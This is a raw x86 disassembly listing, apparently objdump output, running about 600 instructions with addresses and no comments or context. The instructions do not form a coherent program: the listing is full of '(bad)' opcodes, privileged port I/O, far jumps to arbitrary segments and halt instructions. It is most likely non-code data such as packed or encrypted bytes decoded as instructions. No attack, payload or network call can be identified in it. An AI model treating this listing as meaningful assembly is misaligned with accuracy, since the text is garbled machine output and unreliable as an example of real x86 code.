  421ae5:	out    0xeb,eax
  421ae7:	fld    TBYTE PTR [ebp+0x20ecad61]
  421aed:	jns    0x421a87
  421aef:	mov    cl,0x45
  421af1:	push   es
  421af2:	pop    es
  421af3:	imul   BYTE PTR [edx-0x2b]
  421af6:	lods   al,BYTE PTR ds:[esi]
  421af7:	inc    ebp
  421af8:	cmp    ah,ah
  421afa:	push   eax
  421afb:	pop    DWORD PTR [esi+0x1b2f6f0b]
  421b01:	scas   eax,DWORD PTR es:[edi]
  421b02:	scas   eax,DWORD PTR es:[edi]
  421b03:	scas   eax,DWORD PTR es:[edi]
  421b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b05:	mov    esp,DWORD PTR [eax-0x35]
  421b08:	pop    ss
  421b09:	ins    DWORD PTR es:[edi],dx
  421b0a:	or     al,bl
  421b0c:	inc    ebp
  421b0d:	repnz rcr ebx,1
  421b10:	ins    DWORD PTR es:[edi],dx
  421b11:	push   esi
  421b12:	push   ecx
  421b13:	cmc    
  421b14:	sbb    esp,esp
  421b16:	push   es
  421b17:	adc    dl,BYTE PTR [edi-0x2b0d6fb]
  421b1d:	outs   dx,DWORD PTR ds:[esi]
  421b1e:	ja     0x421b67
  421b20:	mov    esp,0x952e325e
  421b25:	mov    al,0x5f
  421b27:	test   BYTE PTR [ecx-0x927f040],bh
  421b2d:	mov    DWORD PTR [ebx-0x2c0cef3a],esi
  421b33:	bound  edx,QWORD PTR [eax-0x6081d49f]
  421b39:	ins    DWORD PTR es:[edi],dx
  421b3a:	mov    al,0xb
  421b3c:	push   0x8993062
  421b41:	ret    
  421b42:	icebp  
  421b43:	pcmpeqb mm5,QWORD PTR [ebp-0x4e0c3151]
  421b4a:	push   ebx
  421b4b:	dec    BYTE PTR [esi-0x44]
  421b4e:	xchg   esi,eax
  421b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b50:	(bad)  
  421b52:	jo     0x421b91
  421b54:	jbe    0x421b21
  421b56:	inc    ecx
  421b57:	cmp    DWORD PTR [edi+0x3],esi
  421b5a:	lea    esp,[eax]
  421b5c:	ss test al,0x57
  421b5f:	or     al,BYTE PTR [esi]
  421b61:	mov    ebx,0x72ee6e6c
  421b66:	ret    0x5bb0
  421b69:	lahf   
  421b6a:	mov    eax,ds:0xae4d46d4
  421b6f:	ja     0x421be8
  421b71:	jg     0x421b0e
  421b73:	fdiv   DWORD PTR [ebp+0x14]
  421b76:	add    al,0x4d
  421b78:	(bad)  
  421b79:	dec    eax
  421b7a:	out    dx,eax
  421b7b:	lock mov ah,0xe3
  421b7e:	mov    bl,0x7b
  421b80:	je     0x421be3
  421b82:	in     eax,dx
  421b83:	loope  0x421bcb
  421b85:	mov    dh,0xa2
  421b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b88:	cld    
  421b89:	adc    cl,BYTE PTR [edx+eax*2]
  421b8c:	stc    
  421b8d:	cld    
  421b8e:	and    dl,BYTE PTR [edi-0xc]
  421b91:	mov    eax,0x5f4548ba
  421b96:	or     bl,BYTE PTR [ecx]
  421b98:	jecxz  0x421b43
  421b9a:	sub    BYTE PTR [eax],0x9a
  421b9d:	leave  
  421b9e:	int    0x6c
  421ba0:	xlat   BYTE PTR ds:[ebx]
  421ba1:	loope  0x421b55
  421ba3:	mov    eax,0x5a3f6134
  421ba8:	pop    ebp
  421ba9:	sbb    DWORD PTR [edi-0x7ccb51b4],edx
  421baf:	leave  
  421bb0:	in     eax,0xe5
  421bb2:	std    
  421bb3:	je     0x421be6
  421bb5:	push   edx
  421bb6:	or     BYTE PTR [edx-0x3ff35358],bl
  421bbc:	mov    ah,0x1a
  421bbe:	(bad)  
  421bbf:	nop
  421bc0:	mov    esi,0x96e4f444
  421bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bc6:	sub    eax,ebx
  421bc8:	imul   esi,ebp,0x7d80405b
  421bce:	pop    edi
  421bcf:	and    eax,0x9b0c54f6
  421bd4:	xchg   ebx,eax
  421bd5:	pushf  
  421bd6:	dec    esi
  421bd7:	repz pop ebx
  421bd9:	push   ds
  421bda:	(bad)  
  421bdb:	mov    bl,0x5d
  421bdd:	xor    al,ch
  421bdf:	js     0x421c2d
  421be1:	adc    eax,0xa600796d
  421be6:	dec    edx
  421be7:	cmp    bl,BYTE PTR [edx]
  421be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bea:	or     DWORD PTR fs:[edi],eax
  421bed:	repz es int 0xaa
  421bf1:	scas   eax,DWORD PTR es:[edi]
  421bf2:	mov    cl,0x35
  421bf4:	(bad)  
  421bf5:	shl    BYTE PTR [eax-0x55],cl
  421bf8:	ja     0x421c3f
  421bfa:	cmp    eax,0x7cac26e5
  421bff:	and    ebp,edi
  421c01:	rcr    BYTE PTR [ebx-0x4f429524],1
  421c07:	fidivr WORD PTR [eax-0x6e]
  421c0a:	cmp    ebp,0x9
  421c0d:	and    edi,DWORD PTR [ebp+ebp*1-0x31]
  421c11:	cmc    
  421c12:	popa   
  421c13:	cmp    eax,0xe3b5fd41
  421c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c19:	popa   
  421c1a:	retf   
  421c1b:	sbb    al,0xa7
  421c1d:	push   ss
  421c1e:	rol    ebx,1
  421c20:	popf   
  421c21:	cmp    al,0xc7
  421c23:	cmp    al,0x40
  421c25:	pop    esi
  421c26:	cmp    bh,0x98
  421c29:	mov    BYTE PTR [edi+0x5c1665ff],bh
  421c2f:	aam    0xc4
  421c31:	repnz scas al,BYTE PTR es:[edi]
  421c33:	iret   
  421c34:	add    ebx,DWORD PTR [edi+eax*2-0x48869609]
  421c3b:	jle    0x421c88
  421c3d:	add    dl,BYTE PTR [esi]
  421c3f:	imul   eax,DWORD PTR [esi],0xfffffffd
  421c42:	retf   0x6cac
  421c45:	retf   0x983a
  421c48:	pop    ss
  421c49:	mov    esp,edi
  421c4b:	jp     0x421bf0
  421c4d:	pop    ecx
  421c4e:	iret   
  421c4f:	pushf  
  421c50:	mov    cl,0xf1
  421c52:	pop    esp
  421c53:	frndint 
  421c55:	dec    ebp
  421c56:	push   esi
  421c57:	cdq    
  421c58:	push   eax
  421c59:	push   0x7cae2acc
  421c5e:	fistp  QWORD PTR [ecx]
  421c60:	and    dl,BYTE PTR [esi]
  421c62:	sbb    eax,0x89e1aee2
  421c67:	stos   DWORD PTR es:[edi],eax
  421c68:	and    al,0x87
  421c6a:	test   edi,esp
  421c6c:	add    bl,ah
  421c6e:	lahf   
  421c6f:	out    dx,al
  421c70:	or     ch,BYTE PTR [esp+esi*2+0x3a]
  421c74:	dec    ebp
  421c75:	ret    
  421c76:	icebp  
  421c77:	imul   eax,DWORD PTR [edx+0x383321e0],0x6e
  421c7e:	pop    ds
  421c7f:	enter  0x792a,0xe
  421c83:	ds pop ebx
  421c85:	test   ebp,esi
  421c87:	retf   0x777d
  421c8a:	inc    edx
  421c8b:	jge    0x421c73
  421c8d:	cmp    edi,DWORD PTR [edx+edi*4-0x1a]
  421c91:	and    eax,ebp
  421c93:	outs   dx,BYTE PTR ds:[esi]
  421c94:	cmp    al,0xdd
  421c96:	das    
  421c97:	mov    DWORD PTR [eax+esi*2+0x354e4da8],eax
  421c9e:	icebp  
  421c9f:	adc    eax,0xdd027f85
  421ca4:	dec    edi
  421ca5:	stos   DWORD PTR es:[edi],eax
  421ca6:	pop    ds
  421ca7:	cmpxchg DWORD PTR [edi+0x6432d4ce],esp
  421cae:	add    BYTE PTR [esi-0x3],ch
  421cb1:	xchg   edi,eax
  421cb2:	xor    BYTE PTR [edi-0x61],ah
  421cb5:	jo     0x421c64
  421cb7:	(bad)  
  421cb8:	out    dx,eax
  421cb9:	push   esi
  421cba:	enter  0x86fa,0x50
  421cbe:	rcr    BYTE PTR [ebx],0x8f
  421cc1:	jl     0x421d36
  421cc3:	mov    bh,0x9d
  421cc5:	cmc    
  421cc6:	and    BYTE PTR [ebp-0x12],bh
  421cc9:	push   cs
  421cca:	mov    ah,0x53
  421ccc:	sub    esp,DWORD PTR cs:[ecx+0x271e980d]
  421cd3:	adc    ecx,DWORD PTR [ebx-0x629bd489]
  421cd9:	lea    edi,ds:0x3cf42204
  421cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ce0:	xor    BYTE PTR [ebx-0x4c51412c],al
  421ce6:	fwait
  421ce7:	cmp    eax,0xe80618b0
  421cec:	inc    esi
  421ced:	test   BYTE PTR [esp+edx*2+0x3276e39a],0x7d
  421cf5:	add    eax,0x6a0f6d6f
  421cfa:	outs   dx,BYTE PTR ds:[esi]
  421cfb:	ret    
  421cfc:	scas   al,BYTE PTR es:[edi]
  421cfd:	dec    esi
  421cfe:	jae    0x421cf2
  421d00:	loopne 0x421d19
  421d02:	cdq    
  421d03:	outs   dx,BYTE PTR ds:[esi]
  421d04:	pop    ebx
  421d05:	push   ecx
  421d06:	cmp    al,0xb2
  421d08:	or     DWORD PTR [ebp+0x12],0xffffff8f
  421d0c:	rcr    BYTE PTR [ebx],cl
  421d0e:	retf   0xa986
  421d11:	mov    ebp,0x90835707
  421d17:	dec    esi
  421d18:	fwait
  421d19:	adc    ch,al
  421d1b:	lahf   
  421d1c:	fistp  WORD PTR [edx]
  421d1e:	pop    ebp
  421d1f:	daa    
  421d20:	es pop es
  421d22:	loop   0x421ccb
  421d24:	pop    ecx
  421d25:	enter  0xfa57,0xd2
  421d29:	cmp    eax,0x4a67e751
  421d2e:	xchg   ebp,eax
  421d2f:	ror    BYTE PTR [eax+0x108c14a8],0x13
  421d36:	cmc    
  421d37:	pop    ds
  421d38:	mov    ah,0xec
  421d3a:	mov    BYTE PTR [ebx-0x664e7fcb],0x1e
  421d41:	pop    ss
  421d42:	cmp    BYTE PTR [esp+ebx*4-0x4d27f8aa],bh
  421d49:	or     BYTE PTR [eax-0x3],0x8e
  421d4d:	inc    eax
  421d4e:	and    bh,BYTE PTR [ebx]
  421d50:	dec    ebp
  421d51:	inc    edx
  421d52:	jl     0x421d32
  421d54:	mov    edi,0xc410c06
  421d59:	hlt    
  421d5a:	jb     0x421db9
  421d5c:	outs   dx,DWORD PTR ds:[esi]
  421d5d:	add    ch,BYTE PTR [esi]
  421d5f:	mov    al,ds:0x5467a895
  421d64:	adc    DWORD PTR [ecx+0xbf1693b],ecx
  421d6a:	xor    BYTE PTR [edx+0x7d],ch
  421d6d:	fcmovne st,st(5)
  421d6f:	shl    DWORD PTR [ecx],cl
  421d71:	pop    ebx
  421d72:	jno    0x421d1b
  421d74:	(bad)  
  421d75:	push   edx
  421d76:	push   esi
  421d77:	jmp    0xb954:0xa085fc2f
  421d7e:	sub    dl,BYTE PTR [edi]
  421d80:	push   ebp
  421d81:	xchg   ecx,eax
  421d82:	or     ebx,DWORD PTR [edi]
  421d84:	jo     0x421de7
  421d86:	pop    ecx
  421d87:	(bad)  
  421d88:	ins    BYTE PTR es:[edi],dx
  421d89:	add    DWORD PTR [eax+0x1592dfbc],ebx
  421d8f:	jge    0x421dd1
  421d91:	pop    ebp
  421d92:	sbb    eax,0xe83364ad
  421d97:	push   cs
  421d98:	push   edx
  421d99:	loop   0x421d8d
  421d9b:	leave  
  421d9c:	std    
  421d9d:	xor    DWORD PTR [ecx+eax*4],edi
  421da0:	out    dx,eax
  421da1:	mov    eax,DWORD PTR [ebp+0x36]
  421da4:	stc    
  421da5:	loope  0x421d60
  421da7:	icebp  
  421da8:	dec    eax
  421da9:	(bad)  
  421daa:	sbb    BYTE PTR [edx],dh
  421dac:	cmp    al,0x4f
  421dae:	mov    ah,0xeb
  421db0:	dec    ebx
  421db1:	rol    DWORD PTR [eax],0x62
  421db4:	mov    BYTE PTR [ecx-0x531b33d6],bl
  421dba:	popf   
  421dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dbc:	stos   DWORD PTR es:[edi],eax
  421dbd:	cmp    BYTE PTR [eax],ah
  421dbf:	ss jb  0x421d83
  421dc2:	jecxz  0x421e35
  421dc4:	lahf   
  421dc5:	popa   
  421dc6:	push   0xffffffae
  421dc8:	and    eax,0x68d5e06d
  421dcd:	pop    edi
  421dce:	adc    ebp,edi
  421dd0:	sbb    ebp,DWORD PTR [eax-0x5e0aa071]
  421dd6:	ins    BYTE PTR es:[edi],dx
  421dd7:	jne    0x421db8
  421dd9:	jl     0x421e10
  421ddb:	loop   0x421df2
  421ddd:	inc    ecx
  421dde:	dec    ebx
  421ddf:	dec    esi
  421de0:	out    0xc,eax
  421de2:	std    
  421de3:	or     eax,0xc37f3b21
  421de8:	sub    al,0x15
  421dea:	mov    dh,BYTE PTR [ebp+0xb]
  421ded:	fsub   DWORD PTR [ecx+0x6d]
  421df0:	out    dx,al
  421df1:	mov    ah,BYTE PTR [ebx-0x61aa281a]
  421df7:	in     al,0xed
  421df9:	(bad)  
  421dfa:	push   ss
  421dfb:	or     al,0xc3
  421dfd:	or     al,0xc2
  421dff:	adc    esi,DWORD PTR [eax+edx*4]
  421e02:	jmp    0x421d97
  421e04:	sub    bh,BYTE PTR [ebx-0xb]
  421e07:	inc    edx
  421e08:	dec    edi
  421e09:	retf   0x6961
  421e0c:	jge    0x421db4
  421e0e:	cli    
  421e0f:	sahf   
  421e10:	fwait
  421e11:	jne    0x421dee
  421e13:	out    0x92,eax
  421e15:	jmp    0x421e7d
  421e17:	mov    edx,0xfad5adc9
  421e1c:	or     BYTE PTR [edi-0x80],bl
  421e1f:	call   0x476b:0x34adb399
  421e26:	pop    ecx
  421e27:	imul   esi,DWORD PTR [eax-0xe],0x64d32029
  421e2e:	loop   0x421e59
  421e30:	cmp    DWORD PTR [esi-0x21],esi
  421e33:	ins    BYTE PTR es:[edi],dx
  421e34:	push   edx
  421e35:	or     BYTE PTR [eax+esi*2-0x1a],al
  421e39:	mov    edx,DWORD PTR [edx-0x38]
  421e3c:	dec    esi
  421e3d:	test   DWORD PTR [eax-0x5789584f],0xe4212c
  421e47:	mov    bh,0x1a
  421e49:	add    ebx,DWORD PTR [ecx-0x75]
  421e4c:	jb     0x421eae
  421e4e:	xchg   ecx,eax
  421e4f:	dec    ecx
  421e50:	mov    esi,DWORD PTR [eax-0x6a3f449c]
  421e56:	leave  
  421e57:	aad    0x39
  421e59:	mov    al,0x27
  421e5b:	call   0x1acc:0xed085185
  421e62:	mov    eax,0x91993811
  421e67:	pusha  
  421e68:	mov    dl,0xef
  421e6a:	stos   BYTE PTR es:[edi],al
  421e6b:	mov    al,ds:0xe6f36c40
  421e70:	fdiv   QWORD PTR [edi-0x6431edff]
  421e76:	jae    0x421dff
  421e78:	mov    edi,0x15584f00
  421e7d:	popf   
  421e7e:	iret   
  421e7f:	inc    eax
  421e80:	scas   eax,DWORD PTR es:[edi]
  421e81:	mov    ecx,0x88376fbd
  421e86:	dec    esi
  421e87:	xchg   BYTE PTR [esi],dh
  421e89:	mov    ds:0xa3f23643,eax
  421e8e:	cdq    
  421e8f:	loop   0x421e23
  421e91:	fs into 
  421e93:	fld    DWORD PTR [ecx]
  421e95:	call   0x5a56:0xfeb05fb7
  421e9c:	add    DWORD PTR [edx-0x20],0x1e
  421ea0:	xor    ecx,DWORD PTR [edi+0x1b29fefb]
  421ea6:	sbb    BYTE PTR [esi],ch
  421ea8:	xor    DWORD PTR [ecx],0xa6751915
  421eae:	jno    0x421e52
  421eb0:	xchg   ecx,eax
  421eb1:	inc    BYTE PTR [ebx]
  421eb3:	jae    0x421e69
  421eb5:	out    dx,eax
  421eb6:	xor    BYTE PTR [eax],0x9
  421eb9:	loop   0x421f14
  421ebb:	dec    ecx
  421ebc:	fstp   QWORD PTR [esi]
  421ebe:	ror    edx,0x9c
  421ec1:	or     DWORD PTR [esi+0x1ab69068],0x4d
  421ec8:	pop    edx
  421ec9:	mov    gs,WORD PTR [edi]
  421ecb:	shl    BYTE PTR [ebp-0x21],1
  421ece:	ficomp WORD PTR [ebx+0x6b]
  421ed1:	popf   
  421ed2:	mov    ebx,0x7b9afdd2
  421ed7:	pusha  
  421ed8:	(bad)  
  421ed9:	pop    ebx
  421eda:	jle    0x421f15
  421edc:	fistp  QWORD PTR [ebp+0x2029cb32]
  421ee2:	loopne 0x421e90
  421ee4:	test   al,0xb4
  421ee6:	stc    
  421ee7:	pop    es
  421ee8:	emms   
  421eea:	sub    DWORD PTR [ecx-0x1b],0x2d
  421eee:	xor    dh,BYTE PTR [ecx]
  421ef0:	dec    ebp
  421ef1:	jae    0x421ef2
  421ef3:	mov    ah,0x26
  421ef5:	sti    
  421ef6:	fmul   QWORD PTR [eax-0x41]
  421ef9:	fistp  QWORD PTR [ecx+0x7ce5a29e]
  421eff:	dec    ebx
  421f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f01:	or     eax,0xb81cd01b
  421f06:	mov    ah,0xe1
  421f08:	ins    BYTE PTR es:[edi],dx
  421f09:	xchg   DWORD PTR [esi+0x52],ebx
  421f0c:	call   0xb5b59708
  421f11:	ins    BYTE PTR es:[edi],dx
  421f12:	mov    ebp,0x30e2c93b
  421f17:	and    edx,0x54fa3bb0
  421f1d:	pop    edx
  421f1e:	adc    esi,DWORD PTR [eax+0x77]
  421f21:	sub    al,0xf9
  421f23:	sbb    ecx,eax
  421f25:	xchg   DWORD PTR [edi-0x63],edx
  421f28:	mov    cl,0xff
  421f2a:	in     al,dx
  421f2b:	out    dx,eax
  421f2c:	(bad)  
  421f2d:	push   ebp
  421f2e:	in     eax,0x80
  421f30:	mov    ch,0x2a
  421f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f33:	add    ebp,ecx
  421f35:	cli    
  421f36:	xor    ecx,DWORD PTR [ebp-0x3c]
  421f39:	pop    ebp
  421f3a:	leave  
  421f3b:	mov    dl,0x15
  421f3d:	shl    eax,1
  421f3f:	push   es
  421f40:	fmul   st,st(6)
  421f42:	shl    BYTE PTR [ebp+0x3c],cl
  421f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f46:	bound  ebx,QWORD PTR [edi+0x49]
  421f49:	les    edx,FWORD PTR [ecx]
  421f4b:	loop   0x421f48
  421f4d:	arpl   WORD PTR [edx+0x3b147b82],bx
  421f53:	(bad)  
  421f54:	stc    
  421f55:	(bad)  
  421f56:	push   cs
  421f57:	xchg   esi,eax
  421f58:	jp     0x421f0a
  421f5a:	xchg   edi,eax
  421f5b:	fidiv  WORD PTR [ecx+0x445d610a]
  421f61:	adc    esp,DWORD PTR [esi-0x50]
  421f64:	mov    ebp,0x8019b33
  421f69:	shl    ah,cl
  421f6b:	mov    al,0xbb
  421f6d:	pop    ds
  421f6e:	lods   eax,DWORD PTR ds:[esi]
  421f6f:	dec    ebp
  421f70:	sar    DWORD PTR [ecx-0x67ed3a4c],1
  421f76:	xor    edx,DWORD PTR [edi+0x20]
  421f79:	add    BYTE PTR [eax],dh
  421f7b:	mov    bh,0x23
  421f7d:	jg     0x421f49
  421f7f:	sti    
  421f80:	sbb    edx,eax
  421f82:	leave  
  421f83:	mov    ds:0x6fafe18b,eax
  421f88:	les    ebx,FWORD PTR [esi]
  421f8a:	ret    
  421f8b:	fdiv   QWORD PTR [ebp+0x284dac70]
  421f91:	int    0x3
  421f93:	inc    edx
  421f94:	js     0x421fba
  421f96:	das    
  421f97:	outs   dx,BYTE PTR ds:[esi]
  421f98:	loop   0x421f41
  421f9a:	and    al,0x92
  421f9c:	push   ebp
  421f9d:	fldcw  WORD PTR [edx+0x4a]
  421fa0:	jl     0x421f9f
  421fa2:	dec    ebx
  421fa3:	push   ss
  421fa4:	mov    ah,0xa4
  421fa6:	loopne 0x422011
  421fa8:	mov    BYTE PTR [ebp+0x43],al
  421fab:	and    esi,esp
  421fad:	jp     0x42202d
  421faf:	(bad)  
  421fb0:	jmp    0x421f44
  421fb2:	cmp    DWORD PTR [ebx+0x63ce2f89],eax
  421fb8:	sbb    ebx,eax
  421fba:	jmp    0x421fc9
  421fbc:	mov    eax,0xc4bc439
  421fc1:	lds    esi,FWORD PTR ds:0xef9b28d2
  421fc7:	sbb    esi,0xffffffe9
  421fca:	or     al,0xc8
  421fcc:	dec    ebp
  421fcd:	inc    edi
  421fce:	mov    ebp,0xe7950d47
  421fd3:	and    DWORD PTR [edx-0x2abcbd77],esi
  421fd9:	cdq    
  421fda:	rol    BYTE PTR [ebx+0x1a],1
  421fdd:	push   ss
  421fde:	xlat   BYTE PTR ds:[ebx]
  421fdf:	sub    al,BYTE PTR [ebx-0x709d2b59]
  421fe5:	jmp    0x8a5c:0xfab86039
  421fec:	fcomp  QWORD PTR [ecx+0x4450cc37]
  421ff2:	jne    0x421f95
  421ff4:	int3   
  421ff5:	mov    ebx,0x2914dc04
  421ffa:	xlat   BYTE PTR ds:[ebx]
  421ffb:	lea    ecx,[esi+0x77]
  421ffe:	stos   DWORD PTR es:[edi],eax
  421fff:	dec    ebx
  422000:	call   0x66ec7e3f
  422005:	mov    ecx,0xb7182d92
  42200a:	and    eax,0x6c707601
  42200f:	pop    eax
  422010:	sub    BYTE PTR ss:[ebx-0xf],ch
  422014:	sub    edi,DWORD PTR [eax]
  422016:	inc    edx
  422017:	cmc    
  422018:	pop    edi
  422019:	imul   ebp,esp,0xdc0b6e0a
  42201f:	bound  esp,QWORD PTR [esi+0x16]
  422022:	sbb    cl,BYTE PTR [ecx+0x11]
  422025:	mov    esi,0xc2407d
  42202a:	leave  
  42202b:	pop    ebp
  42202c:	cli    
  42202d:	(bad)  
  42202e:	aaa    
  42202f:	mov    ds:0x38ebfe4a,eax
  422034:	out    dx,eax
  422035:	xchg   esi,eax
  422036:	cmp    eax,0xc7ca01b9
  42203b:	jmp    0x2a59b838
  422040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422041:	mov    edi,0xe03b35f4
  422046:	mov    ah,BYTE PTR [eax+0x22109e1d]
  42204c:	pusha  
  42204d:	test   eax,0x6d2251c7
  422052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422053:	imul   ebx,DWORD PTR fs:0xaa3fff40,0xa419feb7
  42205e:	xchg   esp,eax
  42205f:	adc    DWORD PTR [ebx],edx
  422061:	or     eax,0x4f8b761e
  422066:	retf   0xd6b7
  422069:	mov    ds:0x20c67c61,eax
  42206e:	nop
  42206f:	mov    eax,0xee2bd537
  422074:	xor    dl,BYTE PTR [ecx]
  422076:	retf   
  422077:	ret    0x45f1
  42207a:	xchg   esi,eax
  42207b:	cmp    BYTE PTR [esi+0x12],cl
  42207e:	ja     0x42200d
  422080:	mov    ecx,0xd58713e4
  422085:	stos   BYTE PTR es:[edi],al
  422086:	mov    eax,0x5b44de79
  42208b:	or     ebx,DWORD PTR [eax]
  42208d:	or     bl,BYTE PTR [ecx]
  42208f:	jg     0x4220dc
  422091:	lods   eax,DWORD PTR ds:[esi]
  422092:	ds pusha 
  422094:	out    dx,al
  422095:	add    ecx,DWORD PTR [ebx]
  422097:	inc    ecx
  422098:	jnp    0x422082
  42209a:	leave  
  42209b:	(bad)  
  42209c:	or     eax,0x20137ba5
  4220a1:	and    al,0xb7
  4220a3:	inc    esp
  4220a4:	jb     0x422068
  4220a6:	fdivp  st(3),st
  4220a8:	mov    eax,ss
  4220aa:	sbb    eax,0x8b2ae2
  4220af:	sub    cl,BYTE PTR [edx+0x743b7af1]
  4220b5:	cs push ds
  4220b7:	ins    DWORD PTR es:[edi],dx
  4220b8:	xor    al,0x25
  4220ba:	pushf  
  4220bb:	iret   
  4220bc:	push   ds
  4220bd:	pop    ss
  4220be:	sub    al,0xc
  4220c0:	dec    ebp
  4220c1:	push   esp
  4220c2:	aad    0xbe
  4220c4:	push   ecx
  4220c5:	sub    al,0x5d
  4220c7:	das    
  4220c8:	in     al,dx
  4220c9:	dec    ecx
  4220ca:	add    esi,DWORD PTR [esi]
  4220cc:	pop    ebp
  4220cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220ce:	jle    0x42206b
  4220d0:	mov    ebx,0xfc6c263b
  4220d5:	lods   al,BYTE PTR ds:[esi]
  4220d6:	jg     0x422093
  4220d8:	jg     0x42207c
  4220da:	sar    DWORD PTR [edx+0x2d],0x73
  4220de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220df:	popa   
  4220e0:	loop   0x4220e9
  4220e2:	or     al,0x2d
  4220e4:	sbb    edi,0xffffffb2
  4220e7:	daa    
  4220e8:	idiv   DWORD PTR [ebp+0x45]
  4220eb:	mov    BYTE PTR [edx+esi*1+0x242a25e7],ah
  4220f2:	pop    ss
  4220f3:	cld    
  4220f4:	inc    esp
  4220f5:	mov    bh,ah
  4220f7:	jmp    0x4220a2
  4220f9:	xchg   ebx,eax
  4220fa:	sub    ebx,esi
  4220fc:	add    bh,ah
  4220fe:	xor    BYTE PTR [esi+0x523f5b7f],bh
  422104:	adc    edi,DWORD PTR [edx-0x65da3858]
  42210a:	ins    DWORD PTR es:[edi],dx
  42210b:	or     ch,BYTE PTR [ecx-0x22]
  42210e:	(bad)
  422112:	push   cs
  422113:	pop    ss
  422114:	js     0x42213f
  422116:	xor    al,0xc9
  422118:	mov    edx,0xcd708070
  42211d:	xor    DWORD PTR [ecx],eax
  42211f:	and    DWORD PTR [edi],ebx
  422121:	or     BYTE PTR [eax],0xee
  422124:	in     al,0x8f
  422126:	and    BYTE PTR [eax+0x77c16f25],0xc7
  42212d:	sbb    ch,bh
  42212f:	mov    ebx,0x33f6cb42
  422134:	ds inc eax
  422136:	mov    ebx,DWORD PTR ds:0x4f2c5a59
  42213c:	inc    ebx
  42213d:	sbb    DWORD PTR [esi],0x22
  422140:	fwait
  422141:	add    ch,BYTE PTR ds:0x6d5765d3
  422147:	or     DWORD PTR [esi],esi
  422149:	rcr    bl,1
  42214b:	mov    eax,ds:0xfe8e0c87
  422150:	jge    0x4221ac
  422152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422153:	cmp    BYTE PTR [edx-0x2],bh
  422156:	les    ebx,FWORD PTR [esp+edx*4]
  422159:	jb     0x4221d1
  42215b:	lock push ecx
  42215d:	xor    eax,edx
  42215f:	add    DWORD PTR [ecx],edx
  422161:	sbb    ebp,edx
  422163:	hlt    
  422164:	int    0xcf
  422166:	pop    ebx
  422167:	add    esp,esi
  422169:	sub    al,0xda
  42216b:	loope  0x4221e4
  42216d:	jg     0x42212e
  42216f:	sub    DWORD PTR [edx],ebx
  422171:	fs pop edi
  422173:	retf   0x1886
  422176:	adc    eax,DWORD PTR [eax+0x3d]
  422179:	out    dx,al
  42217a:	jno    0x422176
  42217c:	add    eax,ebp
  42217e:	fmul   st,st(6)
  422180:	test   eax,0x9cee6bd7
  422185:	pop    eax
  422186:	push   ebp
  422187:	shl    edx,cl
  422189:	add    BYTE PTR ds:0xe0587c68,0x8b
  422190:	mov    ah,0x95
  422192:	pusha  
  422193:	adc    eax,0xfed061ec
  422198:	cmp    bl,BYTE PTR [edi+0x32]
  42219b:	cmp    ebx,DWORD PTR [ecx-0x54]
  42219e:	loop   0x4221fe
  4221a0:	ss inc ebp
  4221a2:	jb     0x422161
  4221a4:	fidiv  DWORD PTR [edx-0x9]
  4221a7:	or     DWORD PTR [ebx+ebx*2],esp
  4221aa:	jnp    0x42212f
  4221ac:	xor    eax,DWORD PTR [eax+0x5ec3b07]
  4221b2:	test   eax,0x4856bcef
  4221b7:	jl     0x4221ae
  4221b9:	ins    DWORD PTR es:[edi],dx
  4221ba:	adc    eax,0x28766a80
  4221bf:	cwde   
  4221c0:	inc    ecx
  4221c1:	sub    ebp,ecx
  4221c3:	fcmovnbe st,st(0)
  4221c5:	dec    ebx
  4221c6:	xchg   ebp,eax
  4221c7:	or     al,0x85
  4221c9:	inc    esp
  4221ca:	loope  0x4221a4
  4221cc:	sti    
  4221cd:	rol    BYTE PTR [ebp+0x3a2d6b9],0xd7
  4221d4:	(bad)  
  4221d5:	mov    ebp,0x6be9215f
  4221da:	push   esp
  4221db:	push   es
  4221dc:	sub    eax,esp
  4221de:	xor    ch,BYTE PTR [eax]
  4221e0:	out    dx,al
  4221e1:	(bad)  
  4221e4:	push   esi
  4221e5:	out    0xd2,eax
  4221e7:	stos   BYTE PTR es:[edi],al
  4221e8:	xchg   DWORD PTR [esi+ebp*1+0x40],esi
  4221ec:	fs jo  0x422241
  4221ef:	mov    ds:0x13e69ad0,al
  4221f4:	jns    0x422190
  4221f6:	xor    DWORD PTR [edx],ebp
  4221f8:	loope  0x4221bc
  4221fa:	adc    DWORD PTR [ebx-0xb360740],esi
  422200:	std    
  422201:	sbb    eax,0x18c58375
  422206:	and    eax,0x167c8e39
  42220b:	test   eax,0xbe3ff3e9
  422210:	mov    al,0x12
  422212:	xchg   BYTE PTR [eax+0x25],cl
  422215:	mov    esp,DWORD PTR [edx]
  422217:	push   ebx
  422218:	add    ah,BYTE PTR [edx]
  42221a:	jno    0x4221c3
  42221c:	xchg   edx,eax
  42221d:	inc    eax
  42221e:	sbb    DWORD PTR [esi+0x6e24fa73],ebp
  422224:	stos   BYTE PTR es:[edi],al
  422225:	retf   0x8a7b
  422228:	ins    BYTE PTR es:[edi],dx
  422229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42222a:	mov    ah,0x99
  42222c:	les    eax,FWORD PTR [ebx+0x3c395485]
  422232:	fwait
  422233:	inc    esp
  422234:	fdivr  DWORD PTR [ecx]
  422236:	sahf   
  422237:	jl     0x422261
  422239:	pushf  
  42223a:	inc    esi
  42223b:	retf   
  42223c:	sub    al,0x63
  42223e:	push   edi
  42223f:	in     eax,dx
  422240:	(bad)  
  422241:	(bad)  
  422243:	ror    dl,cl
  422245:	call   0x94aee703
